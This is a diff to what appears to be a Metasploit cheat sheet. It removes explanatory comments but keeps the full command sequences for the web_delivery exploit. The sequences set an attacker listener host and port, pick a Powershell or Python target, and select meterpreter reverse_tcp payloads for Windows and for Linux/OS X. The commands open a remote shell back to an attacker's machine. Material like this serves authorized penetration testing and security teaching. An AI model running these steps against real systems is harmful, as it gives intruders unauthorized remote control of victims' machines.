@@ -80,20 +80,20 @@ sessions -l                   List all active sessions.
 
 - Windows
 use exploit/multi/script/web_delivery
-set LHOST <attacker IP>       Set the listner to the attacker's IP.
-set LPORT 443                 Set the listening port to 443.
+set LHOST <attacker IP>
+set LPORT 443
 show TARGETS                  Show all targets.
 set TARGET 2                  Set the target language to Powershell.
 set PAYLOAD windows/meterpreter/reverse_tcp
-exploit                       Run the exploit.
+exploit
 
 - Linux and OS X
 use exploit/multi/script/web_delivery
-set LHOST <attacker IP>       Set the listner to the attacker's IP.
-set LPORT 443                 Set the listening port to 443.
+set LHOST <attacker IP>
+set LPORT 443
 set TARGET 0                  Set the target language to Python.
 set PAYLOAD python/meterpreter/reverse_tcp
-exploit                       Run the exploit.
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # Sessions
